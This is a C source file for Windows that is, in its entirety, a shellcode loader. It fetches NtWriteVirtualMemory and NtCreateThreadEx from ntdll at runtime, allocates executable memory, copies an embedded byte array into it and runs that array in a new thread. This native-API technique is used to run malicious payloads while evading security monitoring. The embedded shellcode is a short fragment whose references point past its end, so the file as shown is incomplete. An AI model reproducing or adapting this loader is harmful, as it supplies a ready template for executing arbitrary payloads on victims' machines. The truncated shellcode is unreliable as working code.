#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Function prototypes for Native APIs
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main(void) {
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66,
        0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x52, 0x00, 0x00, 0x00, 0xE8, 0x00,
        0x00, 0x00, 0x00, 0x58
    };

    HMODULE hNtdll;
    HANDLE hProcess;
    HANDLE hThread;
    PVOID baseAddress;
    ULONG bytesWritten;
    NTSTATUS status;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtCreateThreadEx NtCreateThreadEx;

    /* Get handle to ntdll.dll */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("Failed to get ntdll handle\n");
        return 1;
    }
    
    /* Get function addresses */
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtWriteVirtualMemory || !NtCreateThreadEx) {
        printf("Failed to get function addresses\n");
        return 1;
    }

    /* Get process handle */
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (hProcess == NULL) {
        printf("Failed to open process\n");
        return 1;
    }
    
    /* Allocate memory with execute permissions */
    baseAddress = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(shellcode), 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    if (baseAddress == NULL) {
        printf("Failed to allocate memory\n");
        CloseHandle(hProcess);
        return 1;
    }

    /* Write shellcode using NtWriteVirtualMemory */
    status = NtWriteVirtualMemory(
        hProcess,
        baseAddress,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    if (status != 0) {
        printf("Failed to write memory\n");
        VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    /* Create thread to execute shellcode */
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        baseAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("Failed to create thread\n");
        VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    
    /* Cleanup */
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, baseAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return 0;
}